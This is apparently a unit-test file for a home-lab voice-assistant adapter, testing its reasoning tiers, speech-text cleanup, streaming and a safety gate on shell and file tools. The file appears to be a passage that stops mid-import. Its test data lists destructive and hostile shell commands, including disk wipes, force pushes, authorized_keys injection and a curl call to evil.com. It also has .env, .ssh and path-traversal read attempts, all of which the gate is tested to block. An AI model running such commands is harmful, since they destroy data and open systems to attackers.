#!/usr/bin/env python3
# ruff: noqa: BLE001, EXE001, I001, S110, UP006, UP035, UP045
"""Unit tests for `/workspace/tools/gotchi_zero_adapter.py`."""

import asyncio
import base64
from pathlib import Path
import sys
import time
from typing import Any, Dict, List

_REPO_ROOT = str(Path(__file__).resolve().parent.parent)
if _REPO_ROOT not in sys.path:
    sys.path.insert(0, _REPO_ROOT)
if f"{_REPO_ROOT}/gotchi" not in sys.path:
    sys.path.insert(1, f"{_REPO_ROOT}/gotchi")
if "/workspace" not in sys.path:
    sys.path.append("/workspace")
if "/workspace/gotchi" not in sys.path:
    sys.path.append("/workspace/gotchi")

from fastapi.testclient import TestClient

from tools.gotchi_zero_adapter import (
    DEFAULT_GOTCHI_MODEL,
    GOTCHI_THINKING_TELEMETRY,
    GotchiZeroBrainAdapter,
    _build_gotchi_tools,
    build_gotchi_static_system_instruction,
    build_gotchi_zero_system_prompt,
    build_thinking_config,
    clean_spoken_text_for_tts,
    create_zero_gotchi_app,
    execute_gotchi_tool_call,
    extract_and_forward_artifacts_to_zero_chat,
    is_allowed_voice_read_path,
    is_destructive_voice_command,
    is_destructive_voice_write,
    is_owner_gotchi_node,
    prefetch_zero_memory,
    select_thinking_budget,
    select_thinking_level,
    send_gotchi_artifact_to_zero_chat,
)
from poc.gotchi_poc import wrap_pcm16_to_wav


def test_clean_spoken_text_for_tts():
    raw = (
        "### Status Update\n"
        "- **Printer:** Ready at [OctoPrint](<https://198.51.100.10:8888>)!\n"
        "- Check `build_case.py` or <https://example.com/test>."
    )
    cleaned = clean_spoken_text_for_tts(raw)
    assert "###" not in cleaned
    assert "**" not in cleaned
    assert "`" not in cleaned
    assert "https://" not in cleaned
    assert "OctoPrint" in cleaned
    assert "build_case.py" in cleaned


def test_select_thinking_budget_and_fast_memory_prefetch():
    assert DEFAULT_GOTCHI_MODEL == "gemini-3.8-flash"
    # Tier 1: Step 0 and Step 1 default to LOW / 128 -> 256
    assert select_thinking_level("How warm is the garage?", step=0) == "LOW"
    assert select_thinking_level("Summarize the memory lookup", step=1) == "LOW"
    assert select_thinking_budget("How warm is the garage?", step=0) == 128
    assert select_thinking_budget("Summarize the memory lookup", step=1) == 256

    # Tier 2: Escalates to MEDIUM / 512 on tool error, Step 2+, or 5-frame camera burst
    assert select_thinking_level("Retry after error", step=1, tool_had_error=True) == "MEDIUM"
    assert select_thinking_level("Chained multi-tool step", step=2) == "MEDIUM"
    assert select_thinking_level("Burst analysis", step=0, burst_count=5) == "MEDIUM"
    assert select_thinking_budget("Retry after error", step=1, tool_had_error=True) == 512
    assert select_thinking_budget("Chained multi-tool step", step=2) == 512
    assert select_thinking_budget("Burst analysis", step=0, burst_count=5) == 512

    # Tier 3: Escalates to HIGH / 1024 when model invokes request_deep_thinking
    prev_high = GOTCHI_THINKING_TELEMETRY["HIGH"]
    assert (
        select_thinking_level(
            "Deep battery tradeoff",
            step=1,
            model_requested_deep_thinking=True,
        )
        == "HIGH"
    )
    assert GOTCHI_THINKING_TELEMETRY["HIGH"] == prev_high + 1
    assert (
        select_thinking_budget(
            "Deep battery tradeoff",
            step=1,
            model_requested_deep_thinking=True,
        )
        == 1024
    )

    cfg_38_low = build_thinking_config("gemini-3.8-flash", "Quick status check", step=1)
    assert str(cfg_38_low.thinking_level).endswith("LOW")
    cfg_38_med = build_thinking_config("gemini-3.8-flash", "Step 2 chain", step=2)
    assert str(cfg_38_med.thinking_level).endswith("MEDIUM")
    cfg_38_high = build_thinking_config(
        "gemini-3.8-flash",
        "Deep math",
        step=1,
        model_requested_deep_thinking=True,
    )
    assert str(cfg_38_high.thinking_level).endswith("HIGH")

    # Warm up connection on first call, then verify sub-50ms warm recall
    _ = prefetch_zero_memory("gotchi hardware companion")
    t0 = time.monotonic()
    _ = prefetch_zero_memory("gotchi hardware companion")
    elapsed_ms = (time.monotonic() - t0) * 1000.0
    assert elapsed_ms < 50.0


def test_build_gotchi_zero_system_prompt_shares_zero_voice_context():
    prompt = build_gotchi_zero_system_prompt("What is on my task list?", has_vision=True)
    assert "GOTCHI & ZERO-VOICE UNIFIED PERSONA INVARIANTS" in prompt
    assert "Schedar" in prompt
    assert "live camera snapshot or 5-frame burst" in prompt
    assert "post_note_to_zero_chat" in prompt
    assert "request_deep_thinking(spoken_preamble, reason)" in prompt
    assert "PRE-TOOL SPOKEN PREAMBLE" in prompt
    assert "ZERO CORE OPERATIONAL REFERENCE (/workspace/GEMINI.md)" in prompt
    assert "ZERO MANDATORY OPERATIONAL RULES (/workspace/.agents/rules/*.md)" in prompt


def test_voice_security_gate_and_realpath_read_allowlist(monkeypatch, tmp_path):
    staged_msgs: List[Any] = []
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda ch, content, **kw: staged_msgs.append((int(ch), content)),
    )

    # 1. ALL shell commands from owner nodes stage #zero-chat confirmation (shell=True RCE removed)
    shell_calls: List[Any] = []
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.subprocess.run",
        lambda *a, **kw: shell_calls.append((a, kw)),
    )
    shell_res = asyncio.run(
        execute_gotchi_tool_call("run_shell_command", {"command": "git status -s"})
    )
    assert shell_res.get("confirmation_required") is True
    assert shell_res.get("status") == "staged_in_zero_chat"
    assert shell_calls == []

    find_res = asyncio.run(
        execute_gotchi_tool_call(
            "run_shell_command",
            {"command": "find /workspace/tools -maxdepth 1 -name gotchi_zero_adapter.py"},
            allow_unconfirmed_mutations=True,
        )
    )
    assert find_res.get("confirmation_required") is True
    assert find_res.get("status") == "staged_in_zero_chat"
    assert shell_calls == []

    # 2. Destructive shell commands also trigger stage_voice_mutation_confirmation without subprocess.run
    destructive_cmds = [
        "rm -rf /workspace/tmp_test",
        "git reset --hard HEAD~1",
        "docker compose down",
    ]
    for d_cmd in destructive_cmds:
        d_res = asyncio.run(
            execute_gotchi_tool_call("run_shell_command", {"command": d_cmd})
        )
        assert d_res["confirmation_required"] is True
        assert d_res["status"] == "staged_in_zero_chat"
        assert any(
            ch == 1542081375287640084 and d_cmd in body for ch, body in staged_msgs
        )
    assert shell_calls == []

    # 3. Writing a new file inside an allowed root succeeds directly
    ws_allowed = tmp_path / "workspace"
    ws_allowed.mkdir(exist_ok=True)
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._ALLOWED_VOICE_READ_PREFIXES",
        ("/workspace/", "/baseball/", str(ws_allowed)),
    )

    new_allowed_file = ws_allowed / "notes.txt"
    write_res = asyncio.run(
        execute_gotchi_tool_call(
            "write_local_file",
            {"file_path": str(new_allowed_file), "content": "fresh voice note"},
        )
    )
    assert write_res.get("confirmation_required") is not True
    assert "Successfully wrote" in write_res.get("status", "")
    assert new_allowed_file.read_text() == "fresh voice note"

    # 4. Overwriting an existing file triggers confirmation and does not mutate disk
    overwrite_res = asyncio.run(
        execute_gotchi_tool_call(
            "write_local_file",
            {"file_path": str(new_allowed_file), "content": "overwriting note"},
        )
    )
    assert overwrite_res["confirmation_required"] is True
    assert overwrite_res["status"] == "staged_in_zero_chat"
    assert new_allowed_file.read_text() == "fresh voice note"
    assert any(
        ch == 1542081375287640084 and "overwriting note" in body
        for ch, body in staged_msgs
    )

    # 5. Writing outside allowed roots triggers confirmation
    outside_file = tmp_path / "outside_allowed.txt"
    outside_res = asyncio.run(
        execute_gotchi_tool_call(
            "write_local_file",
            {"file_path": str(outside_file), "content": "outside text"},
        )
    )
    assert outside_res["confirmation_required"] is True
    assert outside_res["status"] == "staged_in_zero_chat"
    assert not outside_file.exists()

    # 6. read_local_file allowlist resolves os.path.realpath BEFORE checking prefixes and blocks .env / .ssh / traversal
    ok_readme, resolved_readme = is_allowed_voice_read_path("/workspace/gotchi/README.md")
    assert ok_readme is True
    assert resolved_readme.endswith("/gotchi/README.md")

    # Rejects traversal outside /workspace/ or /baseball/
    ok_trav, _ = is_allowed_voice_read_path("/workspace/../etc/passwd")
    assert ok_trav is False

    # Rejects .env and .ssh by basename and path segment
    ok_env, _ = is_allowed_voice_read_path("/workspace/.env")
    assert ok_env is False
    ok_env_prod, _ = is_allowed_voice_read_path("/workspace/gotchi/.env.production")
    assert ok_env_prod is False
    ok_ssh, _ = is_allowed_voice_read_path("/workspace/.ssh/id_ed25519")
    assert ok_ssh is False

    # Rejects symlink inside allowed root pointing to .env or outside root
    secret_env = ws_allowed / ".env"
    secret_env.write_text("SECRET=123")
    symlink_to_env = ws_allowed / "innocent_notes.txt"
    symlink_to_env.symlink_to(secret_env)
    ok_sym, reason_sym = is_allowed_voice_read_path(
        str(symlink_to_env),
        allowed_prefixes=(str(ws_allowed),),
    )
    assert ok_sym is False
    assert ".env" in reason_sym

    outside_secret = tmp_path / "outside_secret.txt"
    outside_secret.write_text("OUTSIDE=1")
    symlink_outside = ws_allowed / "escape.txt"
    symlink_outside.symlink_to(outside_secret)
    ok_escape, reason_escape = is_allowed_voice_read_path(
        str(symlink_outside),
        allowed_prefixes=(str(ws_allowed),),
    )
    assert ok_escape is False
    assert "outside allowed voice read roots" in reason_escape


def test_is_destructive_voice_command_and_write(tmp_path):
    # Non-destructive commands return (False, "")
    for safe_cmd in [
        "git status -s",
        "git log -n 5",
        "git diff HEAD~1",
        "find /workspace/tools -maxdepth 1 -name gotchi_zero_adapter.py",
        "python3 /workspace/tools/gotchi_zero_adapter.py",
        "curl -s http://localhost:8000/health",
        "ls -la /workspace",
        "cat /workspace/README.md",
        "docker ps",
        "docker compose ps",
        "systemctl status nginx",
    ]:
        is_destr, r = is_destructive_voice_command(safe_cmd)
        assert is_destr is False, f"Expected non-destructive: {safe_cmd} -> {r}"
        assert r == ""

    # Destructive commands return (True, reason)
    for bad_cmd in [
        "rm -rf /workspace/tmp_test",
        "rmdir old_dir",
        "unlink file.txt",
        "shred -u secret.txt",
        "truncate -s 0 log.txt",
        "find /workspace -name '*.tmp' -delete",
        "python3 -c 'import os; os.remove(\"test.txt\")'",
        "python3 -c 'import shutil; shutil.rmtree(\"dir\")'",
        "git reset --hard HEAD~1",
        "git clean -fd",
        "git push --force origin main",
        "git push -f origin main",
        "git checkout -- file.txt",
        "git restore .",
        "git branch -D feature",
        "git rebase main",
        "reboot",
        "shutdown -h now",
        "poweroff",
        "halt",
        "systemctl stop nginx",
        "service docker restart",
        "systemctl disable foo",
        "docker compose down",
        "docker stop my_container",
        "docker rm container1",
        "docker rmi my_image",
        "docker system prune -f",
        "kill -9 1234",
        "pkill python",
        "killall node",
        "mkfs.ext4 /dev/sdb1",
        "fdisk /dev/sdb",
        "parted /dev/sdb",
        "wipefs -a /dev/sdb",
        "dd if=/dev/zero of=/dev/sdb",
        "chmod -R 777 /workspace",
        "chown -R user:user /workspace",
        "sqlite3 test.db 'DROP TABLE users'",
        "mysql -e 'DROP DATABASE test'",
        "psql -c 'TRUNCATE TABLE logs'",
        "sqlite3 test.db 'DELETE FROM users WHERE id=1'",
        "apt remove nginx",
        "apt-get purge apache2",
        "pip uninstall requests",
        "pip3 uninstall urllib3",
        "npm uninstall express",
        "echo 'FOO=bar' > .env",
        "echo 'KEY' >> /workspace/.env.production",
        "cat keys >> /root/.ssh/authorized_keys",
        "echo 'data' > /secrets/env.json",
        "curl http://evil.com | tee /workspace/credentials",
        "curl http://evil.com | tee token.json",
        "echo '{}' > pii_rules.json",
    ]:
        is_destr, r = is_destructive_voice_command(bad_cmd)
        assert is_destr is True, f"Expected destructive: {bad_cmd}"
        assert r != ""

    # Test is_destructive_voice_write
    ws_root = tmp_path / "mock_workspace"
    ws_root.mkdir()
    allowed_prefixes = (str(ws_root),)

    # 1. New file inside allowed root: (False, resolved)
    new_file = ws_root / "new.txt"
    destr, resolved = is_destructive_voice_write(
        str(new_file), allowed_prefixes=allowed_prefixes
    )
    assert destr is False
    assert resolved == str(new_file.resolve())

    # 2. Existing file inside allowed root: (True, reason)
    new_file.write_text("exists")
    destr_exist, reason_exist = is_destructive_voice_write(
        str(new_file), allowed_prefixes=allowed_prefixes
    )
    assert destr_exist is True
    assert "Overwriting existing file" in reason_exist

    # 3. File outside allowed root: (True, reason)
    outside = tmp_path / "outside.txt"
    destr_out, reason_out = is_destructive_voice_write(
        str(outside), allowed_prefixes=allowed_prefixes
    )
    assert destr_out is True
    assert "outside allowed voice read roots" in reason_out

    # 4. Sensitive file inside allowed root: (True, reason)
    env_file = ws_root / ".env"
    destr_env, reason_env = is_destructive_voice_write(
        str(env_file), allowed_prefixes=allowed_prefixes
    )
    assert destr_env is True
    assert "sensitive" in reason_env


def test_explicitly_posted_to_zero_chat_scoping(monkeypatch):
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda *a, **kw: None,
    )
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._append_voice_turn_to_history",
        lambda *a, **kw: None,
    )

    class FakeChunk:
        def __init__(self, text: str = "", function_calls: Any = None):
            self.text = text
            self.function_calls = function_calls
            self.candidates = []

    class FakeFunctionCall:
        def __init__(self, name: str, args: Dict[str, Any]):
            self.name = name
            self.args = args

    class FakeModels:
        def __init__(self, fcalls: List[Any]):
            self.fcalls = fcalls
            self.step = 0

        async def generate_content_stream(self, model: str, contents: Any, config: Any):
            if self.step == 0:
                self.step += 1
                yield FakeChunk(function_calls=self.fcalls)
            else:
                yield FakeChunk(text="Command finished.")

    class FakeAio:
        def __init__(self, fcalls: List[Any]):
            self.models = FakeModels(fcalls)

    class FakeGenaiClient:
        def __init__(self, fcalls: List[Any]):
            self.aio = FakeAio(fcalls)

    async def run_scenario(fcalls: List[Any]) -> bool:
        adapter = GotchiZeroBrainAdapter(api_key="fake-key", dispatch_discord=False)
        adapter._genai_client = FakeGenaiClient(fcalls)
        _, posted, _ = await adapter._run_gemini_with_tools(
            prompt="test",
            image_bytes=None,
            burst_images=[],
        )
        return posted

    # Read-only tool does not set explicitly_posted_to_zero_chat
    p_read = asyncio.run(
        run_scenario([FakeFunctionCall("read_local_file", {"file_path": "/workspace/README.md"})])
    )
    assert p_read is False

    # All shell commands now stage confirmation in #zero-chat (setting explicitly_posted_to_zero_chat)
    p_safe = asyncio.run(
        run_scenario([FakeFunctionCall("run_shell_command", {"command": "git status -s"})])
    )
    assert p_safe is True

    # Destructive shell sets explicitly_posted_to_zero_chat
    p_destr = asyncio.run(
        run_scenario([FakeFunctionCall("run_shell_command", {"command": "rm -rf /workspace/tmp"})])
    )
    assert p_destr is True

    # post_note_to_zero_chat sets explicitly_posted_to_zero_chat
    p_note = asyncio.run(
        run_scenario([FakeFunctionCall("post_note_to_zero_chat", {"message": "link note"})])
    )
    assert p_note is True


def test_streaming_gemini_sentence_splitter_and_deep_thinking_escalation(monkeypatch):
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda *a, **kw: None,
    )
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._append_voice_turn_to_history",
        lambda *a, **kw: None,
    )

    recorded_configs: List[Any] = []

    class FakeChunk:
        def __init__(self, text: str = "", function_calls: Any = None):
            self.text = text
            self.function_calls = function_calls
            self.candidates = []

    class FakeFunctionCall:
        def __init__(self, name: str, args: Dict[str, Any]):
            self.name = name
            self.args = args

    class FakeModels:
        def __init__(self):
            self.call_idx = 0

        async def generate_content_stream(self, model: str, contents: Any, config: Any):
            recorded_configs.append(config.thinking_config)
            idx = self.call_idx
            self.call_idx += 1
            if idx == 0:
                # Step 0 (LOW): calls request_deep_thinking with a spoken preamble
                yield FakeChunk(
                    function_calls=[
                        FakeFunctionCall(
                            "request_deep_thinking",
                            {
                                "spoken_preamble": "Let me run the numbers on that.",
                                "reason": "battery life calculation",
                            },
                        )
                    ]
                )
            else:
                # Step 1 (escalated to HIGH): streams token deltas across sentence boundaries
                yield FakeChunk(text="Dr. Smith confirmed ")
                yield FakeChunk(text="the rail holds 4.1 volts. ")
                yield FakeChunk(text="Current draw is 18 milliamps.")

    class FakeAio:
        def __init__(self):
            self.models = FakeModels()

    class FakeGenaiClient:
        def __init__(self):
            self.aio = FakeAio()

    adapter = GotchiZeroBrainAdapter(api_key="fake-key", dispatch_discord=False)
    adapter._genai_client = FakeGenaiClient()

    streamed_live: List[str] = []
    res = asyncio.run(
        adapter.handle_turn(
            {
                "node_id": "gotchi-ryan-01",
                "session_id": "sess-stream-1",
                "prompt": "Calculate battery life under load.",
                "_on_sentence": streamed_live.append,
            }
        )
    )
    # Step 0 ran at LOW, Step 1 escalated to HIGH via request_deep_thinking
    assert str(recorded_configs[0].thinking_level).endswith("LOW")
    assert str(recorded_configs[1].thinking_level).endswith("HIGH")
    # Spoken preamble + streamed sentences arrived in order without splitting on 'Dr.' or '4.1'
    assert streamed_live == [
        "Let me run the numbers on that.",
        "Dr. Smith confirmed the rail holds 4.1 volts.",
        "Current draw is 18 milliamps.",
    ]
    assert "Dr. Smith confirmed the rail holds 4.1 volts." in res["reply"]


def test_extract_and_forward_artifacts_to_zero_chat(monkeypatch, tmp_path):
    enqueued: List[Any] = []
    delivered_files: List[Any] = []
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda ch, content, **kw: enqueued.append((int(ch), content)),
    )
    monkeypatch.setattr(
        "tools.deliver_image.deliver_file",
        lambda path, channel_input=None, caption=None, **kw: (
            delivered_files.append((str(path), int(channel_input), caption)) or {"success": True}
        ),
    )

    # 1. Hyperlink in raw_reply -> auto-forwarded to #zero-chat (1542081375287640084) + spoken cue added
    raw = "Found the switch at [DigiKey](<https://example.com/switch>)."
    spoken = clean_spoken_text_for_tts(raw)
    updated_spoken, sent = extract_and_forward_artifacts_to_zero_chat(
        raw_reply=raw,
        spoken_reply=spoken,
        explicitly_posted_in_turn=False,
        dispatch_discord=True,
    )
    assert sent is True
    assert "Zero-Chat" in updated_spoken
    assert any(ch == 1542081375287640084 and "https://example.com/switch" in body for ch, body in enqueued)

    # 2. Explicit file attachment via send_gotchi_artifact_to_zero_chat (within allowed read prefix)
    ws_art = tmp_path / "workspace_artifacts"
    ws_art.mkdir(exist_ok=True)
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._ALLOWED_VOICE_READ_PREFIXES",
        ("/workspace/", "/baseball/", str(ws_art)),
    )
    dummy_stl = ws_art / "case.stl"
    dummy_stl.write_bytes(b"solid gotchi_case\nendsolid gotchi_case\n")
    res = send_gotchi_artifact_to_zero_chat(
        message="Here is the STL render and [Printables Link](<https://example.com/model>).",
        file_path=str(dummy_stl),
        mirror_gotchi_chat=True,
    )
    assert res["ok"] is True
    assert res["file_delivered"] is True
    assert any(cid == 1542081375287640084 for _, cid, _ in delivered_files)


def test_gotchi_zero_adapter_end_to_end_and_channel_logging(monkeypatch, tmp_path):
    enqueued: List[Any] = []
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter.outbox.queue_outbox_message",
        lambda ch, content, **kw: enqueued.append((int(ch), content)),
    )
    monkeypatch.setattr(
        "tools.gotchi_zero_adapter._append_voice_turn_to_history",
        lambda speaker, text, **kw: enqueued.append(("history", speaker, text, kw.get("source_tag"))),
    )
    monkeypatch.setattr(
        "tools.deliver_image.deliver_image",
        lambda path, channel_input=None, caption=None: enqueued.append(("image", channel_input, caption)),
    )

    def fake_llm(turn: Dict[str, Any]) -> Dict[str, Any]:
        return {
            "reply": "**Garage sensor** is at **68°F**. Details at [Home Assistant](<https://example.com>).",
        }

    adapter = GotchiZeroBrainAdapter(llm_caller=fake_llm, dispatch_discord=True)
    app = create_zero_gotchi_app(adapter=adapter)
    client = TestClient(app)

    wav = wrap_pcm16_to_wav(b"\x18\x00" * 8000)
    resp = client.post(
        "/api/voice/interact",
        data={
            "node_id": "gotchi-ryan-01",
            "session_id": "sess-test-42",
            "prompt": "How warm is the garage?",
        },
        files={"audio": ("ptt.wav", wav, "audio/wav")},
    )
    assert resp.status_code == 200
    assert "Garage sensor is at 68" in resp.text
    assert "Zero-Chat" in resp.text
    # Logged to #gotchi-chat (1562246590943461429) AND hyperlink forwarded to #zero-chat (1542081375287640084)
    assert any(item[0] == 1562246590943461429 for item in enqueued if len(item) == 2)
    assert any(item[0] == 1542081375287640084 for item in enqueued if len(item) == 2)

    # Also test direct /api/gotchi/brain subscription_url endpoint with burst images
    b64_img = base64.b64encode(b"\xff\xd8\xff\xe0fakejpeg").decode("ascii")
    brain_resp = client.post(
        "/api/gotchi/brain",
        json={
            "node_id": "gotchi-ryan-01",
            "session_id": "sess-burst-99",
            "prompt": "What part is this?",
            "burst_images_b64": [b64_img, b64_img],
        },
    )
    assert brain_resp.status_code == 200
    data = brain_resp.json()
    assert data["transcript"] == "What part is this?"
    assert "https://" not in data["reply"]
    assert data["sent_to_zero_chat"] is True
    assert any("Zero-Chat" in s for s in data["sentences"])


def test_adapter_ha_fastpath_short_circuits_llm():
    llm_called = False

    def fake_llm(_turn):
        nonlocal llm_called
        llm_called = True
        return {"reply": "LLM fallback reply"}

    def fake_ha_poster(url, headers, payload, timeout_s):
        return {
            "response": {
                "response_type": "action_done",
                "speech": {"plain": {"speech": "Turned on the workbench lamp."}},
                "data": {},
            },
            "conversation_id": "ha-conv-1",
        }

    streamed = []
    adapter = GotchiZeroBrainAdapter(
        llm_caller=fake_llm,
        dispatch_discord=False,
        ha_conversation_enabled=True,
        ha_base_url="http://198.51.100.10:8123",
        ha_access_token="test-token",
        ha_http_poster=fake_ha_poster,
    )
    res = asyncio.run(
        adapter.handle_turn(
            {
                "node_id": "gotchi-ryan-01",
                "session_id": "sess-ha-fast",
                "prompt": "Turn on the workbench lamp",
                "_on_sentence": lambda s: streamed.append(s),
            }
        )
    )
    assert res["ha_fastpath"] is True
    assert res["reply"] == "Turned on the workbench lamp."
    assert streamed == ["Turned on the workbench lamp."]
    assert llm_called is False


def test_adapter_ha_fastpath_falls_back_to_llm_on_no_intent():
    llm_called = False

    def fake_llm(_turn):
        nonlocal llm_called
        llm_called = True
        return {"reply": "Zero LLM handled your general question."}

    def fake_ha_poster(url, headers, payload, timeout_s):
        return {
            "response": {
                "response_type": "error",
                "speech": {"plain": {"speech": "Sorry, I couldn't understand that"}},
                "data": {"code": "no_intent_matched"},
            }
        }

    adapter = GotchiZeroBrainAdapter(
        llm_caller=fake_llm,
        dispatch_discord=False,
        ha_conversation_enabled=True,
        ha_base_url="http://198.51.100.10:8123",
        ha_access_token="test-token",
        ha_http_poster=fake_ha_poster,
    )
    res = asyncio.run(
        adapter.handle_turn(
            {
                "node_id": "gotchi-ryan-01",
                "session_id": "sess-ha-fallback",
                "prompt": "What is the pinout for the MAX98357A?",
            }
        )
    )
    assert res["ha_fastpath"] is False
    assert llm_called is True
    assert "Zero LLM handled" in res["reply"]


def test_direct_audio_race_both_arrival_orders_and_ghost_filter():
    from poc.gotchi_poc import wrap_pcm16_to_wav
    import time

    # 1. Transcript arrives before Gemini's first sentence -> HA fast-path runs & cancels Gemini
    gemini_cancelled = False

    class FastTranscriber:
        llm_config = None
        local_transcriber = True

        def transcribe(self, _wav_bytes: bytes) -> str:
            time.sleep(0.01)
            return "Turn on the workbench lamp"

    async def slow_gemini(prompt, image_bytes, burst_images, on_sentence=None, audio_bytes=None):
        nonlocal gemini_cancelled
        try:
            await asyncio.sleep(0.15)
            if on_sentence:
                on_sentence("Gemini late sentence.")
            return "Gemini late sentence.", False, ["Gemini late sentence."]
        except asyncio.CancelledError:
            gemini_cancelled = True
            raise

    def fake_ha_poster(url, headers, payload, timeout_s):
        return {
            "response": {
                "response_type": "action_done",
                "speech": {"plain": {"speech": "Turned on the workbench lamp."}},
                "data": {},
            },
            "conversation_id": "ha-race-1",
        }

    adapter1 = GotchiZeroBrainAdapter(
        api_key="fake-key",
        dispatch_discord=False,
        stt_adapter=FastTranscriber(),
        ha_conversation_enabled=True,
        ha_base_url="http://198.51.100.10:8123",
        ha_access_token="test-token",
        ha_http_poster=fake_ha_poster,
    )
    adapter1._run_gemini_with_tools = slow_gemini
    streamed1: List[str] = []
    wav = wrap_pcm16_to_wav(b"\x18\x01" * 8000)
    res1 = asyncio.run(
        adapter1.handle_turn(
            {
                "node_id": "gotchi-ryan-01",
                "session_id": "sess-race-1",
                "audio_bytes": wav,
                "_on_sentence": streamed1.append,
            }
        )
    )
    assert res1["ha_fastpath"] is True
    assert res1["reply"] == "Turned on the workbench lamp."
    assert streamed1 == ["Turned on the workbench lamp."]
    assert gemini_cancelled is True

    # 2. Gemini's first sentence arrives before transcript -> releases Gemini immediately and skips HA
    ha_called = False

    class SlowTranscriber:
        llm_config = None
        local_transcriber = True

        def transcribe(self, _wav_bytes: bytes) -> str:
            time.sleep(0.08)
            return "Turn on the workbench lamp"

    async def fast_gemini(prompt, image_bytes, burst_images, on_sentence=None, audio_bytes=None):
        await asyncio.sleep(0.01)
        if on_sentence:
            on_sentence("Gemini first sentence.")
        return "Gemini first sentence.", False, ["Gemini first sentence."]

    def should_not_call_ha(url, headers, payload, timeout_s):
        nonlocal ha_called
        ha_called = True
        return {}

    adapter2 = GotchiZeroBrainAdapter(
        api_key="fake-key",
        dispatch_discord=False,
        stt_adapter=SlowTranscriber(),
        ha_conversation_enabled=True,
        ha_base_url="http://198.51.100.10:8123",
        ha_access_token="test-token",
        ha_http_poster=should_not_call_ha,
    )
    adapter2._run_gemini_with_tools = fast_gemini
    streamed2: List[str] = []
    res2 = asyncio.run(
        adapter2.handle_turn(
            {
                "node_id": "gotchi-ryan-01",
                "session_id": "sess-race-2",
                "audio_bytes": wav,
                "_on_sentence": streamed2.append,
            }
        )
    )
    assert res2["ha_fastpath"] is False
    assert ha_called is False
    assert streamed2 == ["Gemini first sentence."]
    assert res2["reply"] == "Gemini first sentence."

    # 3. When WhisperSTTAdapter is in default "mock" mode (llm_config.stt_engine == "mock"),
    # handle_turn must use _transcribe_audio_with_gemini instead of logging "What is the status?"
    from backend.llm_config import LLMConfig
    from backend.voice_gateway import WhisperSTTAdapter

    mock_stt = WhisperSTTAdapter(
        llm_config=LLMConfig(stt_engine="mock", min_voiced_ms=0, use_silero_vad=False)
    )
    adapter3 = GotchiZeroBrainAdapter(
        api_key="fake-key",
        dispatch_discord=False,
        stt_adapter=mock_stt,
    )
    adapter3._run_gemini_with_tools = fast_gemini

    async def fake_mm_transcribe(_wav: bytes) -> str:
        return "Hello from the real microphone"

    adapter3._transcribe_audio_with_gemini = fake_mm_transcribe
    res3 = asyncio.run(
        adapter3.handle_turn(
            {
                "node_id": "gotchi-ryan-01",
                "session_id": "sess-mock-stt-bypass",
                "audio_bytes": wav,
            }
        )
    )
    assert res3["transcript"] == "Hello from the real microphone"


def test_image_inspection_spoken_filler_and_burst_turn(monkeypatch):
    """
    Verifies that handle_turn and _run_gemini_with_tools process image_bytes and
    burst_images cleanly via _on_sentence.
    """
    for mod_name in ("backend.gotchi_zero_adapter", "tools.gotchi_zero_adapter"):
        try:
            monkeypatch.setattr(f"{mod_name}.outbox.queue_outbox_message", lambda *a, **kw: None)
            monkeypatch.setattr(f"{mod_name}._append_voice_turn_to_history", lambda *a, **kw: None)
        except Exception:
            pass

    from tools.gotchi_zero_adapter import (
        GotchiZeroBrainAdapter as AdapterCls,
        build_contextual_tool_filler,
    )

    single_filler = build_contextual_tool_filler("read_local_file", {"path": "snapshot.jpg"}, "check snapshot")
    assert any(w in single_filler.lower() for w in ["snapshot", "picture", "image"])

    # 2. Test handle_turn with image_bytes streams sentences via _on_sentence
    class FakeChunk:
        def __init__(self, text: str = ""):
            self.text = text
            self.function_calls = None
            self.candidates = []

    class FakeModels:
        async def generate_content_stream(self, model: str, contents: Any, config: Any):
            yield FakeChunk(text="I see a black coffee mug on the wooden desk.")

    class FakeAio:
        def __init__(self):
            self.models = FakeModels()

    class FakeGenaiClient:
        def __init__(self):
            self.aio = FakeAio()

    adapter = AdapterCls(api_key="fake-key", dispatch_discord=False)
    adapter._genai_client = FakeGenaiClient()

    streamed_sentences: List[str] = []
    res = asyncio.run(
        adapter.handle_turn(
            {
                "node_id": "gotchi-ryan-01",
                "session_id": "sess-snapshot-filler-1",
                "image_bytes": b"\xff\xd8\xff\xe0" + b"\x00" * 64,
                "_on_sentence": streamed_sentences.append,
            }
        )
    )

    assert len(streamed_sentences) >= 1
    assert "coffee mug" in streamed_sentences[-1].lower()
    assert "coffee mug" in res["reply"].lower()

    # 3. Test handle_turn with burst_images streams sentences via _on_sentence
    burst_streamed: List[str] = []
    res_burst = asyncio.run(
        adapter.handle_turn(
            {
                "node_id": "gotchi-ryan-01",
                "session_id": "sess-burst-filler-1",
                "burst_images": [b"\xff\xd8\xff\xe0" + b"\x00" * 32] * 5,
                "_on_sentence": burst_streamed.append,
            }
        )
    )
    assert len(burst_streamed) >= 1
    assert "coffee mug" in burst_streamed[-1].lower()
    assert "coffee mug" in res_burst["reply"].lower()


def test_lomin_env_and_dual_flag_aliases(monkeypatch):
    env_path = Path(_REPO_ROOT) / "config" / "lomin.env"
    if not env_path.is_file():
        env_path = Path("/workspace/config/lomin.env")
    assert env_path.is_file()
    content = env_path.read_text(encoding="utf-8")
    for expected_line in (
        "MVG_PORT=8771",
        "GOTCHI_ZERO_MODEL=gemini-3.8-flash",
        "MVG_ENABLE_VISION=1",
        "MVG_VISION_ENABLED=1",
        "MVG_ENABLE_ADPCM=1",
        "MVG_ADPCM_ENABLED=1",
        "MVG_HA_FASTPATH=1",
        "MVG_HA_ENABLED=1",
        "MVG_ENABLE_MIC_REOPEN=1",
        "MVG_MIC_REOPEN_ENABLED=1",
        "MVG_ENABLE_DEFER=1",
        "MVG_DEFER_ENABLED=1",
    ):
        assert expected_line in content

    from tools.gotchi_zero_adapter import (
        is_lomin_adpcm_enabled,
        is_lomin_defer_enabled,
        is_lomin_direct_audio_enabled,
        is_lomin_ha_fastpath_enabled,
        is_lomin_mic_reopen_enabled,
